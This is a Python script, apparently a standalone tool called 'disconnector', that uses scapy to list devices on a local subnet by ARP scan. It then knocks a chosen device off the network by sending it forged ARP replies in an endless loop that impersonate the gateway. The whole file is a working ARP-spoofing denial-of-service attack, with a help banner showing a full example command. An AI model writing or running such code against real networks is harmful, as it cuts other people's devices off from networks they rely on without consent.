import scapy.all as scapy
import sys
import os
import time

class Disconnector:
    
    def __init__(self, hwdst, pdst, gateway):
        self.hwdst = hwdst #target MAC address
        self.pdst = pdst #target IP
        self.gateway = gateway #network GateWay

    def disconnector(self):
        print("Disconnecting!!!!")
        while True:
            pkt = scapy.ARP(op=2, hwdst=self.hwdst, pdst=self.pdst, psrc=self.gateway)
            scapy.send(pkt, verbose=0)
            
            time.sleep(3)

    def arping(self):
        biggestlen = 0
        biggest_res = []
        counter = 1
        print("please wait...\n\n\n")
        for i in range(5):
            answered_lst = scapy.arping("192.168.100.0/24", verbose=0)[0]
            for i in answered_lst:
                if i not in biggest_res:
                    biggest_res.append(i)
            
        for dev in biggest_res:
            print(f"{dev[1].psrc}:{dev[1].hwsrc}\n")

    def __call__(self):
        print("""
        ----------HELP-----------
        _________________________
        |                        |
        | -h help                |  
        |                        |
        | -hw dst MAC address    |
        |                        |
        | -pd dst IP address     |
        |                        |
        | -g  gateway IP address |
        |                        |
        | -a IP and MAC address  |
        |    of all devices      |
        | -d disconnet device    |                    
        |________________________|
        (**connect to network via wifi**)
        ---------example----------

        disconnector.py -hw 6C:5A:01:AA:12:AC -pd 192.168.100.15 -g 192.168.100.1 -d 

        """)

    

if __name__ == "__main__":
    os.system("cls")
    hwdst = None
    pdst = None
    gateway = None

    if len(sys.argv) < 2:
        e = Disconnector(hwdst=hwdst,pdst=pdst,gateway=gateway)
        e()

    else:
        for _ in range(1,len(sys.argv)):
                if sys.argv[_] == "-d":
                    continue

                if sys.argv[_] == "-h":
                    e = Disconnector(hwdst=hwdst,pdst=pdst,gateway=gateway)
                    e()
                    break

                if sys.argv[_] == "-hw" and hwdst is None:
                    hwdst = sys.argv[_ + 1]
                    sys.argv[_ + 1] = "-hw"
                    continue

                if sys.argv[_] == "-pd" and pdst is None:
                    pdst = sys.argv[_ + 1]
                    sys.argv[_ + 1] = "-pd"
                    continue

                if sys.argv[_] == "-g" and gateway is None:
                    gateway = sys.argv[_ + 1]
                    sys.argv[_ + 1] = "-g"
                    continue

                if sys.argv[_] == "-a":
                    e = Disconnector(hwdst=hwdst,pdst=pdst,gateway=gateway)
                    e.arping()
                    break

                if hwdst is not None and pdst is not None and gateway is not None and "-d" in sys.argv:
                    e = Disconnector(hwdst=hwdst,pdst=pdst,gateway=gateway)
                    e.disconnector()
    



    
